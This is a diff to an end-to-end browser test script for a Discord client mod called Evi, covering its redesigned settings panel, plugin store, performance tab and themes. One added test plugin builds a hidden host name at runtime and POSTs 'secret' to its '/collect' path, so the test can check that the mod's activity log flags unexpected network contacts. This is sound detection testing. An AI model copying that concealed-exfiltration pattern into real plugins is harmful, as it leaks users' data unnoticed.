@@ -28,8 +28,8 @@ const CHROME_PATHS = [
     "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe",
 ];
 
-const plugins: PluginPayload[] = readdirSync(join(DIST, "plugins")).map(id => {
-    const dir = join(DIST, "plugins", id);
+// The shipped plugins, plus ones only the tests use (dist/test-plugins: Toolkit Demo)
+const plugins: PluginPayload[] = ["plugins", "test-plugins"].filter(d => existsSync(join(DIST, d))).flatMap(d => readdirSync(join(DIST, d)).map(id => join(DIST, d, id))).map(dir => {
     const manifest = JSON.parse(readFileSync(join(dir, "manifest.json"), "utf8"));
     return { manifest, code: readFileSync(join(dir, "index.js"), "utf8"), source: "dev" };
 });
@@ -67,6 +67,14 @@ const pulled = {
     "store-pulled": { versions: ["1.0.0"], reason: PULL_REASON, at: PULLED_AT, removed: false },
     "store-scam": { versions: "all" as const, reason: "It asks for your Discord password", at: PULLED_AT, removed: false },
 };
+
+// Contacts a host its code names and one it builds at runtime, for its details' Activity section.
+// Neither exists, so both requests fail; the log keeps host and path, never the query string.
+plugins.push({
+    manifest: { id: "net-user", name: "Net User", version: "0.0.1", enabledByDefault: true },
+    code: "module.exports = { default: { start() { fetch(\"https://api.eviactivity.test/v1/ping?key=hunter2\").catch(() => { }); fetch(\"https://\" + [\"sneaky\", \"eviactivity\", \"test\"].join(\".\") + \"/collect?id=1\", { method: \"POST\", body: \"secret\" }).catch(() => { }); } } };",
+    source: "dev",
+});
 
 // Fails to start on purpose, for the crash report. Its error logs are expected, see BROKEN below.
 const BROKEN = "Broken Plugin";
@@ -1504,7 +1512,7 @@ check("Badges: ours are in Discord's badge directory (Customize your badges, You
     JSON.stringify(badgeSettings.listed.slice(0, 2)) === '["evi-dev","evi-supporter"]' && badgeSettings.sameEntries, badgeSettings.listed);
 check("Badges: a supporter is one badge with the levels as tiers, Gold after 70 days",
     badgeSettings.supporter?.current === "supporter-gold" && badgeSettings.supporter.next === "supporter-emerald" && badgeSettings.supporter.tiers === 8
-    && JSON.stringify(badgeSettings.supporter.owned) === '["Bronze","Silver","Gold"]' && badgeSettings.supporter.progress?.[0]?.threshold === 91, badgeSettings.supporter);
+    && JSON.stringify(badgeSettings.supporter.owned) === '["Bronze","Silver","Gold"]' && badgeSettings.supporter.progress?.[0]?.threshold === 90, badgeSettings.supporter);
 check("Badges: the profile preview while editing shows ours once each, in the pending order",
     JSON.stringify(badgeSettings.preview) === JSON.stringify(["evi-dev", "premium", "|", "evi-dev", "premium", "evi-supporter-gold"]), badgeSettings.preview);
 check("Badges: saving badge settings sends Discord only its own, and ours to evi.rest",
@@ -1564,6 +1572,40 @@ await page.waitForTimeout(300);
 await page.screenshot({ path: join(OUT, "ui-plugins.png") });
 check("Ctrl+Shift+D opens the panel", true);
 
+/** Opens one of the panel's pages (Plugins, Themes, General, Advanced) on one of its tabs */
+async function openTab(section: string, tab: string, on = page) {
+    await on.click(`#dl-tab-${section}`);
+    await on.click(`#dl-subtab-${section}-${tab}`);
+}
+
+/** Plugins come a page at a time: search for one so its card is on the page */
+async function findPlugin(id: string, on = page) {
+    await on.fill("#dl-plugin-search", id);
+    await on.waitForSelector(`li[aria-labelledby="dl-plugin-${id}"]`, { timeout: 3000 });
+}
+
+// Four pages in the sidebar, each with its tabs along the top
+{
+    const layout = await page.evaluate(() => ({
+        pages: [...document.querySelectorAll(".dl-nav-item")].map(b => b.id),
+        tabs: [...document.querySelectorAll(".dl-tabbar-item")].map(b => b.textContent),
+        cards: document.querySelectorAll(".dl-plugin-grid > li").length,
+        pager: document.querySelector('.dl-pagination [aria-current="page"]')?.textContent,
+    }));
+    check("the panel has four pages, Plugins shows Installed and Store tabs and its plugins a page at a time",
+        JSON.stringify(layout.pages) === '["dl-tab-plugins","dl-tab-themes","dl-tab-general","dl-tab-advanced"]'
+        && layout.tabs[0] === "Installed" && layout.tabs[1]?.startsWith("Store") && layout.cards === 12 && layout.pager === "1", layout);
+    await page.getByRole("button", { name: "Page 2", exact: true }).click();
+    await page.waitForTimeout(150);
+    const second = await page.evaluate(() => ({
+        pager: document.querySelector('.dl-pagination [aria-current="page"]')?.textContent,
+        first: document.querySelector(".dl-plugin-grid > li")?.getAttribute("aria-labelledby"),
+    }));
+    await findPlugin("experiments");
+    const searched = await page.evaluate(() => document.querySelector('.dl-pagination [aria-current="page"]')?.textContent ?? "one page");
+    check("Page 2 shows the next plugins; a new search starts over from the first page", second.pager === "2" && !!second.first && searched !== "2", { second, searched });
+}
+
 // No scrollbars in Evi's UI, and nothing reserves room for one
 const scrollbars = await page.evaluate(() => [".dl-sidebar", ".dl-body"].map(sel => {
     const el = document.querySelector<HTMLElement>(sel)!;
@@ -1573,7 +1615,7 @@ check("Evi's panel shows no scrollbars", scrollbars.every(s => s.width === "none
 
 // The Account tab: link this install with a code confirmed on the site, then who it's linked to
 {
-    await page.click("#dl-tab-account");
+    await openTab("general", "account");
     const body = page.locator(".dl-body");
     await body.getByText("Link to your account").waitFor({ timeout: 3000 });
     await page.screenshot({ path: join(OUT, "ui-account.png") });
@@ -1592,7 +1634,7 @@ check("Evi's panel shows no scrollbars", scrollbars.every(s => s.width === "none
 
 // The Updates tab: checks when opened, says what's new, and updates with one button
 {
-    await page.click("#dl-tab-updates");
+    await openTab("general", "updates");
     const body = page.locator(".dl-body");
     await body.getByText("Evi 9.9.0 is available").waitFor({ timeout: 3000 });
     const tab = await page.evaluate(() => {
@@ -1615,6 +1657,7 @@ check("Evi's panel shows no scrollbars", scrollbars.every(s => s.width === "none
     await page.click("#dl-tab-plugins");
 }
 
+await findPlugin("experiments");
 const toggled = await page.evaluate(async () => {
     // Discord's switch is a real checkbox input (checked), ours a button (aria-checked)
     const checkedOf = (el: any) => el.getAttribute("aria-checked") ?? String(el.checked);
@@ -1627,6 +1670,16 @@ const toggled = await page.evaluate(async () => {
     return { before, after, needsReload: state.needsReload, reason: state.reloadReason, saved: (window as any).__test.savedSettings?.plugins?.experiments };
 });
 check("switch disables plugin and persists", toggled.before === "true" && toggled.after === "false" && toggled.saved?.enabled === false, toggled);
+// Discord's switch keeps its real checkbox in a hidden, absolutely placed box. Clicking the switch
+// focuses that checkbox, and the page scrolls to wherever it is: it has to sit on the switch, not far below
+const switchInput = await page.evaluate(() => {
+    const input = document.querySelector<HTMLElement>('[aria-labelledby="dl-plugin-experiments"][role="switch"]')!;
+    const shown = input.closest(".dl-switch-anchor")?.getBoundingClientRect();
+    const r = input.getBoundingClientRect();
+    return { anchored: !!shown, input: Math.round(r.top), switch: shown && Math.round(shown.top), height: shown && Math.round(shown.height) };
+});
+check("a plugin switch's checkbox sits on the switch, so clicking it never scrolls the page away",
+    switchInput.anchored && Math.abs(switchInput.input - switchInput.switch!) <= 64, switchInput);
 // Experiments patches a Flux store: re-running it would register a second store, so it must refuse
 check("unsafe module (Flux store) refuses live replacement, asks for reload", toggled.needsReload && /Flux store/.test(toggled.reason ?? ""), toggled.reason);
 await page.screenshot({ path: join(OUT, "ui-reload-banner.png") });
@@ -1634,6 +1687,7 @@ await page.screenshot({ path: join(OUT, "ui-reload-banner.png") });
 // The kill switch: a plugin Evi pulled never started, and its row says so and why
 {
     const pulledRowSelector = 'li[aria-labelledby="dl-plugin-store-pulled"]';
+    await findPlugin("store-pulled");
     const pulledRow = page.locator(pulledRowSelector);
     await pulledRow.getByText("Turned off by Evi", { exact: true }).waitFor({ timeout: 5000 }).catch(() => { });
     await pulledRow.scrollIntoViewIfNeeded();
@@ -1700,6 +1754,7 @@ await page.screenshot({ path: join(OUT, "ui-reload-banner.png") });
 }
 
 // A plugin's settings open in a dialog: the list underneath doesn't move, Escape closes only the dialog
+await findPlugin("fast-lists");
 const dialog = await page.evaluate(async () => {
     const body = document.querySelector(".dl-body") as HTMLElement;
     const row = document.querySelector('li[aria-labelledby="dl-plugin-fast-lists"]') as HTMLElement;
@@ -1736,6 +1791,7 @@ check("Escape closes the settings dialog, not the Evi panel", !afterEscape.dialo
         (window as any).__unlockSettings = () => { root.unmount(); host.remove(); };
         return true;
     });
+    await findPlugin("friend-online-alerts");
     const row = page.locator('li[aria-labelledby="dl-plugin-friend-online-alerts"]');
     await row.scrollIntoViewIfNeeded();
     await row.locator('[aria-label="Friend Online Alerts settings"]').click();
@@ -1760,6 +1816,7 @@ check("Escape closes the settings dialog, not the Evi panel", !afterEscape.dialo
 }
 
 // A plugin's details: what it can touch, and its whole changelog
+await findPlugin("quick-actions");
 await page.locator('li[aria-labelledby="dl-plugin-quick-actions"]').getByRole("button", { name: "Quick Actions details" }).click();
 await page.waitForSelector("#dl-plugin-quick-actions-info", { timeout: 2000 });
 await page.waitForTimeout(300);
@@ -1769,7 +1826,31 @@ check("Plugin details list its permissions with risk levels and its changelog", 
 await page.keyboard.press("Escape");
 await page.waitForTimeout(200);
 
+// A plugin's details: what it actually did, grouped by host, a host its code doesn't name flagged, no query strings
+await findPlugin("net-user");
+await page.locator('li[aria-labelledby="dl-plugin-net-user"]').getByRole("button", { name: "Net User details" }).click();
+await page.waitForSelector('#dl-plugin-net-user-info [data-plugin-activity="net-user"] li[data-host]', { timeout: 3000 }).catch(() => { });
+const activity = await page.evaluate(() => {
+    const section = document.querySelector('#dl-plugin-net-user-info [data-plugin-activity="net-user"]');
+    const rows = [...section?.querySelectorAll("li[data-host]") ?? []].map(li => ({ host: li.getAttribute("data-host"), unexpected: li.hasAttribute("data-unexpected"), text: li.textContent ?? "" }));
+    return { text: section?.textContent ?? "", rows };
+});
+await page.locator('#dl-plugin-net-user-info [data-plugin-activity="net-user"]').screenshot({ path: join(OUT, "ui-plugin-activity.png") }).catch(() => { });
+const named = activity.rows.find(r => r.host === "api.eviactivity.test");
+const sneaky = activity.rows.find(r => r.host === "sneaky.eviactivity.test");
+check("Plugin details: Activity lists the hosts it contacted, flags one its code doesn't name, and keeps no query strings",
+    activity.text.includes("Activity") && !!named && !named.unexpected && named.text.includes("Contacted api.eviactivity.test") && named.text.includes("GET /v1/ping")
+    && !!sneaky && sneaky.unexpected && sneaky.text.includes("Not in its code") && sneaky.text.includes("POST /collect")
+    && !activity.text.includes("hunter2") && !activity.text.includes("id=1") && !activity.text.includes("secret"), activity);
+await page.locator('#dl-plugin-net-user-info [data-plugin-activity="net-user"]').getByRole("button", { name: "Clear" }).click().catch(() => { });
+await page.waitForTimeout(100);
+const cleared = await page.evaluate(() => document.querySelector('#dl-plugin-net-user-info [data-plugin-activity="net-user"]')?.textContent ?? "");
+check("Plugin details: Clear empties its Activity", cleared.includes("Nothing yet since Discord started."), cleared.slice(0, 200));
+await page.keyboard.press("Escape");
+await page.waitForTimeout(200);
+
 // A plugin that failed to start offers a crash report for its author
+await findPlugin("broken");
 await page.locator('li[aria-labelledby="dl-plugin-broken"]').getByRole("button", { name: "Copy crash report" }).click();
 await page.waitForTimeout(200);
 const report = await page.evaluate(() => navigator.clipboard.readText().catch(e => `clipboard: ${e}`));
@@ -1793,11 +1874,56 @@ await page.waitForTimeout(500);
 const enabledAfterUndo = await enabledIds();
 check("Undo turns the same plugins back on", JSON.stringify(enabledAfterUndo) === JSON.stringify(enabledBefore), enabledAfterUndo);
 
-await page.click("#dl-tab-patches");
+await openTab("advanced", "patches");
 await page.waitForTimeout(200);
 await page.screenshot({ path: join(OUT, "ui-patches.png") });
 
-await page.click("#dl-tab-quickcss");
+// Performance: what each plugin's code cost (clear-urls' sendMessage hook ran in the hooks check)
+await openTab("advanced", "performance");
+await page.waitForSelector("#dl-perf-live table", { timeout: 5000 }).catch(() => { });
+const perf = await page.evaluate(() => {
+    const { perf } = (window as any).Evi;
+    const clearUrls = perf.snapshot().find((p: any) => p.plugin === "clear-urls");
+    return {
+        overhead: perf.measureOverhead() as number,
+        clearUrls: clearUrls && { calls: clearUrls.calls as number, sites: clearUrls.sites.map((s: any) => `${s.name}: ${s.calls}`) as string[] },
+        row: document.querySelector('#dl-perf-live tr[data-plugin="clear-urls"]')?.textContent ?? null,
+        headers: [...document.querySelectorAll("#dl-perf-live thead th")].map(th => th.textContent),
+    };
+});
+check("Performance tab lists each plugin's time, and clear-urls' hook shows up with calls", perf.headers.includes("Since start") && !!perf.row?.includes("Clear URLs") && (perf.clearUrls?.calls ?? 0) > 0 && !!perf.clearUrls?.sites.some((s: string) => s.startsWith("before sendMessage")), perf);
+check(`Measuring a call costs under a microsecond (${perf.overhead.toFixed(3)} µs in Chrome)`, perf.overhead > 0 && perf.overhead < 1, perf.overhead);
+
+// A recording shows exactly what ran while it did, and Discord's long tasks
+await page.getByRole("button", { name: "Start recording" }).click();
+// In a timer, a task of the page's own: DevTools' evaluate doesn't count as one for long tasks
+await page.evaluate(() => new Promise<void>(resolve => setTimeout(() => {
+    const spin = (ms: number) => { const end = performance.now() + ms; while (performance.now() < end); };
+    const obj = { f: () => spin(1) };
+    const unhook = (window as any).Evi.api.hook(obj, "f", "after", () => spin(20), "perf-web-test");
+    for (let i = 0; i < 3; i++) obj.f();
+    unhook();
+    resolve();
+})));
+await page.waitForTimeout(100);
+await page.getByRole("button", { name: "Stop recording" }).click();
+await page.waitForSelector('#dl-perf-recording tr[data-plugin="perf-web-test"]', { timeout: 3000 }).catch(() => { });
+await page.getByRole("button", { name: "Where perf-web-test spends time" }).click().catch(() => { });
+await page.waitForTimeout(300);
+const recorded = await page.evaluate(() => {
+    const row = document.querySelector('#dl-perf-recording tr[data-plugin="perf-web-test"]');
+    return {
+        summary: document.querySelector("#dl-perf-recording [role=status]")?.textContent ?? "",
+        cells: row ? [...row.querySelectorAll("td")].map(td => td.textContent) : null,
+        sites: row?.nextElementSibling?.textContent ?? "",
+    };
+});
+await page.screenshot({ path: join(OUT, "ui-performance.png") });
+check("A recording lists the hook that ran during it: 3 calls, about 60 ms, where it hooked",
+    recorded.cells?.[1] === "3" && parseFloat(recorded.cells?.[0] ?? "") >= 55 && recorded.sites.includes("after f"), recorded);
+check("A recording says how long Discord was held up by long tasks", /Recorded \d/.test(recorded.summary) && /Discord was busy for \d+ ms in \d+ long task/.test(recorded.summary), recorded.summary);
+
+await openTab("themes", "quickcss");
 await page.fill("#dl-quickcss", "body { outline: 3px solid rgb(255, 0, 128) !important; }");
 await page.waitForTimeout(500);
 const quickCss = await page.evaluate(() => getComputedStyle(document.body).outlineColor);
@@ -1805,7 +1931,7 @@ check("Quick CSS applies live", quickCss === "rgb(255, 0, 128)", quickCss);
 await page.screenshot({ path: join(OUT, "ui-quickcss.png") });
 
 // Patch Helper: develop the experiments plugin's own patch live against Discord's code
-await page.click("#dl-tab-patchhelper");
+await openTab("advanced", "patchhelper");
 await page.fill("#dl-ph-find", "Object.defineProperties(this,{isDeveloper");
 await page.fill("#dl-ph-match", String.raw`/(?<=isDeveloper:\{[^}]*?get:\(\)=>)\i/`);
 await page.fill("#dl-ph-replace", "true");
@@ -1841,7 +1967,7 @@ check("Patch Helper: reports a patch that breaks compilation", !!broken?.include
 
 // ---- themes -------------------------------------------------------------------------------------
 
-await page.click("#dl-tab-themes");
+await openTab("themes", "installed");
 await page.waitForSelector("#dl-theme-web-test_css", { timeout: 5000 });
 await page.waitForTimeout(200);
 await page.screenshot({ path: join(OUT, "ui-themes.png") });
@@ -1893,7 +2019,7 @@ await page.screenshot({ path: join(OUT, "ui-themes-added.png") });
 
 // ---- backup -------------------------------------------------------------------------------------
 
-await page.click("#dl-tab-backup");
+await openTab("general", "backup");
 await page.getByRole("button", { name: "Export backup" }).click();
 await page.waitForTimeout(200);
 const exportStatus = await page.evaluate(() => document.querySelector("#dl-tabpanel [role=status]")?.textContent);
@@ -1921,11 +2047,14 @@ check("Backup: restoring applies the new settings live", restored.applied?.mode 
 await page.screenshot({ path: join(OUT, "ui-backup-restored.png") });
 // ---- store --------------------------------------------------------------------------------------
 
-await page.click("#dl-tab-plugins");
-await page.waitForSelector("#dl-open-plugin-store", { timeout: 5000 });
-const bannerText = await page.evaluate(() => document.querySelector(".dl-store-banner")?.textContent ?? "");
-check("Plugins tab shows the store banner with what's new", bannerText.includes("Plugin Store") && /update/.test(bannerText), bannerText);
-await page.click("#dl-open-plugin-store");
+await openTab("plugins", "installed");
+await page.waitForSelector("#dl-plugin-see-updates", { timeout: 5000 });
+const storeTab = await page.evaluate(() => ({
+    pill: document.querySelector("#dl-subtab-plugins-store .dl-tabbar-count")?.textContent,
+    notice: document.querySelector("#dl-plugin-see-updates")?.closest(".dl-notice")?.textContent ?? "",
+}));
+check("Plugins says when store updates are ready: a count on the Store tab and a notice", !!storeTab.pill && Number(storeTab.pill) > 0 && /update/.test(storeTab.notice), storeTab);
+await page.click("#dl-plugin-see-updates");
 await page.waitForSelector('[data-store-id="store-rpc"]', { timeout: 5000 });
 await page.waitForTimeout(200);
 await page.screenshot({ path: join(OUT, "ui-store.png") });
@@ -1950,7 +2079,7 @@ check("Stars: cards show counts, and starring counts once and is sent to main",
     && starsAfter.clock === "Unstar Message Clock, 42 stars" && JSON.stringify(starsAfter.calls) === '[{"kind":"plugin","id":"store-clock","starred":true}]', { starsBefore, starsAfter });
 await page.screenshot({ path: join(OUT, "ui-store-grid.png") });
 check("native plugins carry a badge", storeList.rpc.includes("Native") && !storeList.clock.includes("Native"));
-check("Store cards say when evi.rest knows a plugin is broken", storeList.quiet.includes("Broken since Discord's update") && (await storeCard("store-lookup")).includes("Being looked into") && !storeList.clock.includes("Broken"), storeList.quiet);
+check("Store cards say when evi.rest knows a plugin is broken", storeList.quiet.includes("Broken since Discord’s update") && (await storeCard("store-lookup")).includes("Being looked into") && !storeList.clock.includes("Broken"), storeList.quiet);
 
 // A verified author: a check next to their name, which opens their page
 const verified = await page.locator('[data-store-id="store-lookup"]').getByRole("button", { name: "Evi, verified author" });
@@ -1972,8 +2101,8 @@ check("a verified author has a check and opens their page: bio, links and their 
 await page.getByRole("button", { name: "Plugin Store", exact: true }).click();
 await page.waitForSelector('[data-store-id="store-clock"]', { timeout: 2000 });
 
-const filters = await page.evaluate(() => document.querySelector(".dl-store-filters")?.textContent ?? "");
-check("Store filters by updates, installed and category, and sorts", ["All", "Updates", "Installed", "Messages", "Privacy", "Sort"].every(t => filters.includes(t)), filters);
+const filters = await page.evaluate(() => document.querySelector(".dl-store-controls")?.textContent ?? "");
+check("Store filters by updates, installed and category, and sorts", ["All", "Updates", "Installed", "Official", "Community", "All categories", "Name"].every(t => filters.includes(t)), filters);
 
 // The card itself opens the page: click its middle, not the title
 // force: the card's stretched link is what takes the click, on purpose
@@ -2012,14 +2141,14 @@ const storeButton = (id: string, name: string) => page.locator(`[data-store-id="
     check("a version Evi pulled shows Pulled instead of Install", scam.includes("Pulled") && scamInstall === 0, scam);
 
     const shown = () => page.evaluate(() => [...document.querySelectorAll(".dl-store-grid [data-store-id]")].map(e => e.getAttribute("data-store-id")));
-    await page.locator(".dl-store-filters").getByText(/^Community/).first().click();
+    await page.locator(".dl-store-controls").getByText(/^Community/).first().click();
     await page.waitForTimeout(200);
     const communityOnly = await shown();
     await page.screenshot({ path: join(OUT, "ui-store-community.png") });
-    await page.locator(".dl-store-filters").getByText(/^Official/).first().click();
+    await page.locator(".dl-store-controls").getByText(/^Official/).first().click();
     await page.waitForTimeout(200);
     const officialOnly = await shown();
-    await page.locator(".dl-store-filters").getByText(/^All/).first().click();
+    await page.locator(".dl-store-controls").getByText(/^All \d/).first().click();
     await page.waitForTimeout(200);
     check("the store filters Official and Community plugins",
         JSON.stringify(communityOnly) === '["store-community","store-scam","store-pulled"]' && officialOnly.length === 5 && !officialOnly.includes("store-community"), { communityOnly, officialOnly });
@@ -2107,6 +2236,8 @@ const nativeInstall = {
 };
 check("confirming installs with allowNative and shows the result", nativeInstall.calls.at(-1)?.options?.allowNative === true && nativeInstall.card.includes("Installed and turned on"), nativeInstall);
 
+await page.getByRole("button", { name: "Store settings" }).click();
+await page.waitForTimeout(250);
 const autoUpdate = await page.evaluate(() => document.querySelector(".dl-tab")?.textContent?.includes("Update automatically"));
 check("Store offers automatic updates", !!autoUpdate);
 const healthSetting = await page.evaluate(() => document.querySelector(".dl-tab")?.textContent?.includes("Help spot broken plugins"));
@@ -2121,13 +2252,15 @@ check("Update all installs the new version", updated.includes("Updated to v1.3.0
 await page.screenshot({ path: join(OUT, "ui-store-after.png") });
 
 // Back in the installed list, store plugins carry a badge and can be uninstalled
-await page.getByRole("button", { name: "Installed plugins" }).click();
-await page.waitForSelector('li[aria-labelledby="dl-plugin-store-rpc"]', { timeout: 2000 });
+await page.click("#dl-subtab-plugins-installed");
+await findPlugin("store-rpc");
 const rpcRow = await page.evaluate(() => document.querySelector('li[aria-labelledby="dl-plugin-store-rpc"]')?.textContent ?? "");
 const rpcUninstall = await page.locator('li[aria-labelledby="dl-plugin-store-rpc"]').getByRole("button", { name: "Uninstall store-rpc" }).count();
 check("store plugins show a Store badge and an uninstall button in the list", rpcRow.includes("Store") && rpcUninstall === 1, rpcRow);
 // Plugins Evi ships with can go too: nothing in the list is stuck
-const removable = await page.evaluate(() => [...document.querySelectorAll("li.dl-row[aria-labelledby^='dl-plugin-']")].map(li => ({
+await page.fill("#dl-plugin-search", "");
+await page.waitForTimeout(150);
+const removable = await page.evaluate(() => [...document.querySelectorAll("li.dl-plugin-card[aria-labelledby^='dl-plugin-']")].map(li => ({
     id: li.getAttribute("aria-labelledby"),
     remove: !!li.querySelector("button[aria-label^='Remove '], button[aria-label^='Uninstall ']"),
 })));
@@ -2141,6 +2274,7 @@ const lookupRow = page.locator(lookupRowSelector);
 await page.waitForFunction(() => (window as any).Evi.diagnoseLookups("store-lookup").some((d: any) => d.health === "missing"), null, { timeout: 30_000 }).catch(() => { });
 await page.click("#dl-tab-themes");
 await page.click("#dl-tab-plugins");
+await findPlugin("store-lookup");
 await lookupRow.getByText("Others are seeing this too.", { exact: false }).waitFor({ timeout: 5000 }).catch(() => { });
 const lookupRowText = await page.evaluate(sel => document.querySelector(sel)?.textContent ?? "", lookupRowSelector);
 check("the Plugins list shows what evi.rest knows about a plugin, next to its own problem", ["Being looked into", "Evi: Fix coming in 1.0.1", "Can’t find 1 part of Discord", "Others are seeing this too."].every(t => lookupRowText.includes(t)), lookupRowText.slice(0, 300));
@@ -2180,9 +2314,7 @@ check("plugin health: a store plugin that can't find a part of Discord is report
 
 // ---- theme store --------------------------------------------------------------------------------
 
-await page.click("#dl-tab-themes");
-await page.waitForSelector("#dl-open-theme-store", { timeout: 5000 });
-await page.click("#dl-open-theme-store");
+await openTab("themes", "store");
 await page.waitForSelector('[data-store-id="midnight"]', { timeout: 5000 });
 await page.screenshot({ path: join(OUT, "ui-theme-store.png") });
 await page.locator('[data-store-id="midnight"]').getByRole("button", { name: "Install", exact: true }).click();
@@ -2194,7 +2326,7 @@ const themeInstall = await page.evaluate(() => ({
     applied: getComputedStyle(document.documentElement).getPropertyValue("--dl-store-theme").trim(),
 }));
 check("Theme Store installs a theme and turns it on", JSON.stringify(themeInstall.calls) === '["midnight"]' && themeInstall.card.includes("Installed and turned on") && themeInstall.enabled && themeInstall.applied === "midnight", themeInstall);
-await page.getByRole("button", { name: "Installed themes" }).click();
+await page.click("#dl-subtab-themes-installed");
 await page.waitForTimeout(200);
 const themeRow = await page.evaluate(() => document.querySelector('li[aria-labelledby="dl-theme-midnight_css"]')?.textContent ?? "");
 check("store themes show a Store badge in the Themes tab", themeRow.includes("Midnight") && themeRow.includes("Store"), themeRow);
@@ -2269,6 +2401,7 @@ await safePage.keyboard.press("Control+Shift+D");
 await safePage.waitForSelector(".dl-panel .dl-safe", { timeout: 5000 });
 await safePage.waitForTimeout(300);
 await safePage.screenshot({ path: join(OUT, "safe-mode-plugins.png") });
+await findPlugin("experiments", safePage);
 const paused = await safePage.evaluate(() => document.querySelector('[aria-labelledby="dl-plugin-experiments"]')?.textContent ?? "");
 check("Plugins tab repeats the notice, enabled plugins show as paused", paused.includes("Paused in safe mode"), paused);
 
